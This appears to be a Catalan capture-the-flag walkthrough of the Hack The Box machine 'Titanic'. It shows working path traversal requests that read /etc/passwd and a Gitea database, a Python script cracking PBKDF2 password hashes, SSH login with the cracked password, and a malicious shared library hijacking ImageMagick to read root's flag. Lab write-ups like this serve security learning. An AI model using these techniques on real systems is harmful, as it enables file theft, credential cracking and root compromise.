Anirem directament al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:

```
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -v 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 20:26 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating Ping Scan at 20:26
Scanning 10.10.11.55 [4 ports]
Completed Ping Scan at 20:26, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:26
Completed Parallel DNS resolution of 1 host. at 20:26, 0.02s elapsed
Initiating SYN Stealth Scan at 20:26
Scanning 10.10.11.55 [1000 ports]
Discovered open port 80/tcp on 10.10.11.55
Discovered open port 22/tcp on 10.10.11.55
Completed SYN Stealth Scan at 20:26, 3.50s elapsed (1000 total ports)
Initiating Service scan at 20:26
Scanning 2 services on 10.10.11.55
Completed Service scan at 20:26, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.55.
Initiating NSE at 20:26
Completed NSE at 20:26, 1.50s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.17s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Nmap scan report for 10.10.11.55
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
           Raw packets sent: 1024 (45.032KB) | Rcvd: 1001 (40.048KB)


```

Trobem dos ports oberts, accés a una web pel port 80 i a la que tinguem unes credencials ens podrem connectar per SSH ja que també hi ha accés al port 22 que és el port ssh per defecte. Ara, per tant, afegirem al fitxer /etc/hosts aquesta IP i l'associarem al nom de domini titanic.htb. La web està feta com si es recreés la web del vaixell Titanic, es pot reservar el viatge, veure els serveis que ofereix, etc. La pàgina sembla que està en construcció ja que no van totes les funcionalitats que sembla tenir:

![image](https://github.com/user-attachments/assets/4db27e38-6915-4fa0-8c16-9f1a71ab838b)


Ara farem un wget/curl i un whatweb per veure que hi ha.

```
┌──(kali㉿kali)-[~]
└─$ whatweb http://titanic.htb   
http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]

```

Veiem la versió de Python que té entre d'altres coses.

Ara farem una enumeració de directoris a veure si trobem alguna cosa que ens pugui ser útil, i després farem una enumeració de subdominis:

Un dels directoris trobats és titanic.htb/download i sembla que es poden veure JSON fet a la hora de reservar ticket, potser es poden manipular i ens pot ser útil: 

![image](https://github.com/user-attachments/assets/535ee019-55a6-492e-9dde-e4407e2a1eb9)


És estrany però perquè fer una reserva se'ns desa un fitxer JSON amb les dades que hem emplenat. Els resultats de l'escaneig de directoris on tot ens retorna 400 i per tant no podem fer/veure res:

```    
┌──(kali㉿kali)-[~]
└─$ dirb http://titanic.htb /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 20:41:25 2025
URL_BASE: http://titanic.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://titanic.htb/ ----
+ http://titanic.htb/book (CODE:405|SIZE:153)                                                                                   
+ http://titanic.htb/download (CODE:400|SIZE:41)                                                                                
+ http://titanic.htb/server-status (CODE:403|SIZE:276)                                                                          
                                                                                                                                
-----------------
END_TIME: Sun Feb 23 20:45:04 2025
DOWNLOADED: 4612 - FOUND: 3`
```

Ara farem un escaneig de subdominis a veure si trobem alguna cosa que ens sigui més útil:
 
```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u http://titanic.htb -H "Host:FUZZ.titanic.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 72ms]
:: Progress: [114606/114606] :: Job [1/1] :: 481 req/sec :: Duration: [0:03:05] :: Errors: 0 ::

```

Ara afegim dev.titanic.htb al fitxer /etc/hosts. Aquí ens trobem això:

![image](https://github.com/user-attachments/assets/57ddb299-60ac-4bff-9fe3-8db07ed5072c)


Anem a explore i veiem que hi ha dos repos on potser hi podem trobar alguna vulnerabilitat:

![image](https://github.com/user-attachments/assets/55be4c14-0148-456a-88c3-8d2e04a19878)


Al repo docker-config hi ha la contrasenya root de la BD:

![image](https://github.com/user-attachments/assets/c823e7cb-fb4c-4e27-9423-28239e3edd6a)


També hi ha un repo anomenat flask-app on hi ha un fitxer que es diu app.py, li pregunto al ChatGPT si hi ha alguna vulnerabilitat que podem utilitzar al codi:
```

|   |
|---|
|`from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response`|

|   |
|---|
|`import os`|

|   |
|---|
|`import json`|

|   |
|---|
|`from uuid import uuid4`|

|   |
|---|
||

|   |
|---|
|`app = Flask(__name__)`|

|   |
|---|
||

|   |
|---|
|`TICKETS_DIR = "tickets"`|

|   |
|---|
||

|   |
|---|
|`if not os.path.exists(TICKETS_DIR):`|

|   |
|---|
|`os.makedirs(TICKETS_DIR)`|

|   |
|---|
||

|   |
|---|
|`@app.route('/')`|

|   |
|---|
|`def index():`|

|   |
|---|
|`return render_template('index.html')`|

|   |
|---|
||

|   |
|---|
|`@app.route('/book', methods=['POST'])`|

|   |
|---|
|`def book_ticket():`|

|   |
|---|
|`data = {`|

|   |
|---|
|`"name": request.form['name'],`|

|   |
|---|
|`"email": request.form['email'],`|

|   |
|---|
|`"phone": request.form['phone'],`|

|   |
|---|
|`"date": request.form['date'],`|

|   |
|---|
|`"cabin": request.form['cabin']`|

|   |
|---|
|`}`|

|   |
|---|
||

|   |
|---|
|`ticket_id = str(uuid4())`|

|   |
|---|
|`json_filename = f"{ticket_id}.json"`|

|   |
|---|
|`json_filepath = os.path.join(TICKETS_DIR, json_filename)`|

|   |
|---|
||

|   |
|---|
|`with open(json_filepath, 'w') as json_file:`|

|   |
|---|
|`json.dump(data, json_file)`|

|   |
|---|
||

|   |
|---|
|`return redirect(url_for('download_ticket', ticket=json_filename))`|

|   |
|---|
||

|   |
|---|
|`@app.route('/download', methods=['GET'])`|

|   |
|---|
|`def download_ticket():`|

|   |
|---|
|`ticket = request.args.get('ticket')`|

|   |
|---|
|`if not ticket:`|

|   |
|---|
|`return jsonify({"error": "Ticket parameter is required"}), 400`|

|   |
|---|
||

|   |
|---|
|`json_filepath = os.path.join(TICKETS_DIR, ticket)`|

|   |
|---|
||

|   |
|---|
|`if os.path.exists(json_filepath):`|

|   |
|---|
|`return send_file(json_filepath, as_attachment=True, download_name=ticket)`|

|   |
|---|
|`else:`|

|   |
|---|
|`return jsonify({"error": "Ticket not found"}), 404`|

|   |
|---|
||

|   |
|---|
|`if __name__ == '__main__':`|

`app.run(host='127.0.0.1', port=5000)`

```


El ChatGTP diu el següent:

### **1️⃣ Directory Traversal en `/download`**

**Problema:**  
El paràmetre `ticket` que es passa a `/download` es concatena directament amb `TICKETS_DIR`, cosa que pot permetre un atac de **path traversal** (`../../etc/passwd` per exemple). Un atacant podria intentar accedir a fitxers fora del directori `tickets`.

**Solució:**

- Verificar que `ticket` només conté caràcters alfanumèrics i `.json`
- Fer servir `os.path.abspath()` per comprovar que el fitxer és realment dins `TICKETS_DIR`

Com que ens suggereix un atac utilitzant path_traversal a /etc/passwd a través del directori-endpoint /download és el primer que farem:

### **1️⃣ Prova d'explotació de Path Traversal**

L'endpoint `/download` permet especificar un fitxer mitjançant el paràmetre `ticket`. Si no hi ha validació adequada, es pot intentar accedir a fitxers sensibles:

#### **Intentar llegir `/etc/passwd` (en sistemes Linux)**

`curl "http://127.0.0.1:5000/download?ticket=../../../../etc/passwd"`

Si l'aplicació és vulnerable, això ens retornaria el contingut de `/etc/passwd`. Adaptem la comanda que ens passa el ChatGPT i la tirem afegint l'opció `--path-as-is` que evita que `curl` normalitzi els `..` en la URL, cosa que podria impedir l'explotació si el servidor intenta netejar o modificar el camí abans de processar-lo, però no sembla que hi hagi res interessant:

```
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false`
```

Ens retorna el fitxer /etc/passwd, per tant el path traversal funciona perfectament al no haver-hi una validació adequada. Amb això, veiem que hi ha un usuari anomenat developer, per tant tindrà lògica buscar la user flag a developer. Podem provar la comanda tant fent un curl per consola i veient el resultat:


Com a través de la URL, si ho fem a través de la URL ens descarrega un fitxer que podem llegir:

![image](https://github.com/user-attachments/assets/da0622aa-6d0e-44ff-b64d-c694927c7adc)


El que provaré serà fer una comanda per mirar d'aconseguir la user flag intentat aconseguir llegir el que hi ha d'haver a /home/developer/user.txt. Molt fàcil, com que havia funcionat la comanda que havia dit el ChatGPT ha estat molt fàcil fer funcionar la comanda per aconseguir la user flag, a la primera, ja que l'estructura dels directoris és que el /home està per defecte a l'arrel, igual que el directori /etc:


http://titanic.htb/download?ticket=../../../home/developer/user.txt

![image](https://github.com/user-attachments/assets/8905c1db-57c4-43f1-8f37-0e94c6de757b)

El mateix fet amb curl:

┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../home/developer/user.txt
24bf8635b9d318162e7c29ab1b83c4cb


Ja tenim al user flag!

Ara toca veure com podem accedir a la màquina per ssh i després escalar privilegis per aconseguir la root flag. 

Abans al fer l'escaneig de subdominis hem trobat el subdomini dev.titanic.htb. Segurament allà podrem trobar estirar alguna cosa que ens permeti accedir a la màquina:

A sota de tot de la pàgina hi ha la versió de Gitea, per tant el primer que fem és buscar si té algun CVE o POC:

![image](https://github.com/user-attachments/assets/3e19cbe1-eab7-4f66-bfff-95922bcb9e18)


Impulsado por Gitea Versión: 1.22.1

Al no trobar cap POC ni CVE que pugui explotar de Gitea, seguiré buscant a veure si puc descarregar algun fitxer que hi pugui haver al home de l'usuari developer a veure si hi ha sort. Després de bastanta estona cercant per directoris, anar donant voltes i fent cerques per internet, li pregunto al ChatGPT on es troba la BD de Gitea per defecte ja que he vist que si tant pel navegador com amb curl busco una ruta o fitxer que no existeix al servidor em retorna:

```
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../home/developerrrr          
{"error":"Ticket not found"}`
```

En canvi si la ruta o fitxer existeixen surt un altre error, un 500 del servidor:

```
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../home/developer   
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Per tant li pregunto al ChatGPT per la ruta de la base de dades per defecte de Gitea i em respon:

Gitea pot utilitzar diferents motors de base de dades: SQLite, MySQL/MariaDB o PostgreSQL. La ruta específica de la BD dependrà de la configuració.

```
1. Si utilitza SQLite (per defecte en instal·lacions simples)
La base de dades sol estar en un fitxer anomenat gitea.db, ubicat a:

/var/lib/gitea/data/gitea.db
o

/home/git/gitea/data/gitea.db
Això depèn d'on hagis instal·lat Gitea i sota quin usuari s'estigui executant.
```
``
Amb la informació donada per el ChatGPT i el que hem vist sobre la resposta del servidor per comprovar si una ruta o fitxer existeix i molt temps, hores, he aconseguit trobar contrasenyes d'usuaris a la taula user de la BD, que, no m'ha deixat mostrar amb curl i l'he hagut d'obtenir i descarregar des del navegador:

```
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db

Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or 
Warning: consider "--output <FILE>" to save to a file.
```

![image](https://github.com/user-attachments/assets/7d6fea80-8f17-4892-a0f3-6e48942b504b)


Podem veure totes les taules de la BD, on n'hi ha una que es diu user i podem veure la seva estructura des de la pròpia Kali Linux nostre:

![image](https://github.com/user-attachments/assets/c3cac366-ed85-43a4-b795-3af1887564c1)


I el contingut de la taula user clicant a Browse Table:

![image](https://github.com/user-attachments/assets/ee369d69-b559-44bb-b7a6-c5941bc9f49d)


I ara tenim les contrasenyes dels usuaris en format hash, el salt i el tipus de hash que és:

![image](https://github.com/user-attachments/assets/2f060beb-e2cd-43fa-88d4-f5708549c8f5)


Ara, tocarà mirar de crackejar alguna de les contrasenyes a veure si podem accedir per ssh la màquina víctima amb elles. Els usuaris i contrasenyes trobats a la BD gitea extrets en format JSON:

```
[
    {
        "allow_create_organization": 1,
        "allow_git_hook": 0,
        "allow_import_local": 0,
        "avatar": "2e1e70639ac6b0eecbdab4a3d19e0f44",
        "avatar_email": "root@titanic.htb",
        "created_unix": 1722595379,
        "description": "",
        "diff_view_style": "",
        "email": "root@titanic.htb",
        "email_notifications_preference": "enabled",
        "full_name": "",
        "id": 1,
        "is_active": 1,
        "is_admin": 1,
        "is_restricted": 0,
        "keep_activity_private": 0,
        "keep_email_private": 0,
        "language": "en-US",
        "last_login_unix": 1722597477,
        "last_repo_visibility": 0,
        "location": "",
        "login_name": "",
        "login_source": 0,
        "login_type": 0,
        "lower_name": "administrator",
        "max_repo_creation": -1,
        "must_change_password": 0,
        "name": "administrator",
        "num_followers": 0,
        "num_following": 0,
        "num_members": 0,
        "num_repos": 0,
        "num_stars": 0,
        "num_teams": 0,
        "passwd": "cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136",
        "passwd_hash_algo": "pbkdf2$50000$50",
        "prohibit_login": 0,
        "rands": "70a5bd0c1a5d23caa49030172cdcabdc",
        "repo_admin_change_team_access": 0,
        "salt": "2d149e5fbd1b20cf31db3e3c6a28fc9b",
        "theme": "gitea-auto",
        "type": 0,
        "updated_unix": 1722597477,
        "use_custom_avatar": 0,
        "visibility": 0,
        "website": ""
    },
    {
        "allow_create_organization": 1,
        "allow_git_hook": 0,
        "allow_import_local": 0,
        "avatar": "e2d95b7e207e432f62f3508be406c11b",
        "avatar_email": "developer@titanic.htb",
        "created_unix": 1722595646,
        "description": "",
        "diff_view_style": "",
        "email": "developer@titanic.htb",
        "email_notifications_preference": "enabled",
        "full_name": "",
        "id": 2,
        "is_active": 1,
        "is_admin": 0,
        "is_restricted": 0,
        "keep_activity_private": 0,
        "keep_email_private": 0,
        "language": "en-US",
        "last_login_unix": 1722603397,
        "last_repo_visibility": 0,
        "location": "",
        "login_name": "",
        "login_source": 0,
        "login_type": 0,
        "lower_name": "developer",
        "max_repo_creation": -1,
        "must_change_password": 0,
        "name": "developer",
        "num_followers": 0,
        "num_following": 0,
        "num_members": 0,
        "num_repos": 2,
        "num_stars": 0,
        "num_teams": 0,
        "passwd": "e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56",
        "passwd_hash_algo": "pbkdf2$50000$50",
        "prohibit_login": 0,
        "rands": "0ce6f07fc9b557bc070fa7bef76a0d15",
        "repo_admin_change_team_access": 0,
        "salt": "8bf3e3452b78544f8bee9400d6936d34",
        "theme": "gitea-auto",
        "type": 0,
        "updated_unix": 1722603397,
        "use_custom_avatar": 0,
        "visibility": 0,
        "website": ""
    }
]
```


He hagut de seguir el que s'explica aquí per poder passar el hash de gitea a hashcat: https://0xdf.gitlab.io/2024/12/14/htb-compiled.html. També li he mostrat al ChatGPT i m'ha ajudat i preparat el hash per ser utilitzat per haschat: 

En base a les dades que hem obtingut nosaltres:

- **`passwd`** (digest):  
    `e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`
    
- **`salt`**:  
    `8bf3e3452b78544f8bee9400d6936d34`
    
- **`passwd_hash_algo`**:  
    `pbkdf2$50000$50` → Iteracions: `50000`
    
- **Usuari**: `developer`
### Explicació ràpida:

- `i/PlNSt4VE+L7pQA1pNtNA==` és la **salt** passada de hex a base64.
    
- `5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrZ7yO/F2+8wvxYCYZiY0ROpZTPtW` és el **digest** (passwd) també en base64.


M'ha generat el hash:
``developer:sha256:50000:i/PlNSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrZ7yO/F2+8wvxYCYZiY0ROpZTPtW``


El podem crackejar amb hashcat. Després de VÀRIES HORES hem trobat el hash, no tinc GPU dedicada i per tant hashcat m'ha estat molt lent. 



Alternativament he trobat un script en python per internet que feia el mateix i ha estat molt més ràpid. L'script amb alguna petita adaptació meva:

```
import hashlib
import binascii
 
def pbkdf2_hash(password, salt, iterations=50000, dklen=50):
    hash_value = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        iterations,
        dklen
    )
    return hash_value
 
def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):
    target_hash_bytes = binascii.unhexlify(target_hash)
    
    with open(dictionary_file, 'r', encoding='utf-8') as file:
        count = 0
        for line in file:
            password = line.strip()
            hash_value = pbkdf2_hash(password, salt, iterations, dklen)
            count += 1
            print(f"Comprovant contrasenya {count}: {password}")
            if hash_value == target_hash_bytes:
                print(f"\nFound password: {password}")
                return password
        print("Password not found.")
        return None
 
salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')
target_hash = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
dictionary_file = '/usr/share/wordlists/rockyou.txt'
find_matching_password(dictionary_file, target_hash, salt)
```

El resultat d'executar l'script:

```
Comprovant contrasenya 5620: emogurl
Comprovant contrasenya 5621: callalily
Comprovant contrasenya 5622: baby21
Comprovant contrasenya 5623: 25282528

Found password: 25282528
```

Ara, ja ens podem connectar amb l'usuari developer per ssh ja que ja tenim la seva contrasenya:

```
┌──(kali㉿kali)-[~/Documentos/Titanic]
└─$ ssh developer@10.10.11.55
The authenticity of host '10.10.11.55 (10.10.11.55)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.55' (ED25519) to the list of known hosts.
developer@10.10.11.55's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Apr 21 07:07:49 AM UTC 2025

  System load:  0.02              Processes:             227
  Usage of /:   67.7% of 6.79GB   Users logged in:       1
  Memory usage: 14%               IPv4 address for eth0: 10.10.11.55
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: in**     from 10.10.14.26
developer@titanic:~$ whoami
developer
```


Ara que som dins, hem de veure la forma d'escalar privilegis dins el sistema per obtenir la root flag. Despés de provar vàries coses i donar moltes voltes, veig que hi ha un script:

```
developer@titanic:/opt/scripts$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

## Què fa aquest script?

1. **Canvia de directori** a on hi ha les imatges.

2. Buida el fitxer `metadata.log`.

3. Utilitza `find` per buscar `.jpg` i executa `magick identify` sobre cadascuna.


I aquí està el kit de la qüestió: `magick identify` **és el binari vulnerable** perquè:

- Es carrega com a root.

- Carrega `.so` (shared objects) automàticament.

- Prioritza rutes locals si no està protegit.


Llavors veiem que quan `magick identify` s'executa sobre qualsevol `.jpg`, intenta carregar `libxcb.so.1` si hi ha funcions relacionades amb la GUI (o les fonts o altres backends que la necessiten), i si aquesta `.so` està a la mateixa carpeta que la imatge, **la carrega directament**.

Per tant, ara anem a la carpeta on es troba la imatge usada per l’script: ``cd /opt/app/static/assets/images`` 

Compilem una biblioteca compartida (`.so`) falsa amb codi maliciós:

```
developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home.jpg  luxury-cabins.jpg  metadata.log
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/rootflag");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home.jpg  libxcb.so.1  luxury-cabins.jpg  metadata.log

```

Això funciona així:

- `-shared -fPIC` crea una **biblioteca dinàmica carregable**.

- L’atribut `constructor` fa que el codi s’executi **immediatament en carregar la `.so`**.

- L’ordre `system("cat ...")` copia el contingut de la flag de root.

COMPTE: **El fitxer ha de dir-se exactament:** `libxcb.so.1`

Aquest és el nom que `magick` buscarà internament quan faci la càrrega de biblioteques (en aquest cas perquè s’intenta obrir un `.jpg` que necessita accés a funcionalitats gràfiques).

Ara forçarem que l'script es carregui. Com que `magick` probablement només carrega biblioteques si obre una imatge, forcem que l’script s’activi fent una còpia o modificació d’una imatge existent. Això fa que el script miri de carregar una nova imatge i torni a fer servir `libxcb.so.1`. S'executa i el contingut de `/root/root.txt` es copiarà tal i com hem configurat amb la biblioteca compartida falsa a ``/tmp/rootflag``. I ara ja obtenim la root flag:

```
developer@titanic:/opt/app/static/assets/images$ cp home.jpg home2.jpg
developer@titanic:/opt/app/static/assets/images$ cat /tmp/rootflag
a056d97e2bc1364ef28f80dc0f143ecc
developer@titanic:/opt/app/static/assets/images$ 
```

Abans d'acabar, podríem mirar d'esborrar esborrem les nostres empremtes del sistema: ``rm ./libxcb.so.1 home2.jpg /tmp/rootflag``

Ja tenim la màquina completada !!!

![image](https://github.com/user-attachments/assets/0f566376-3b43-4d60-806d-ba166ac43ac6)






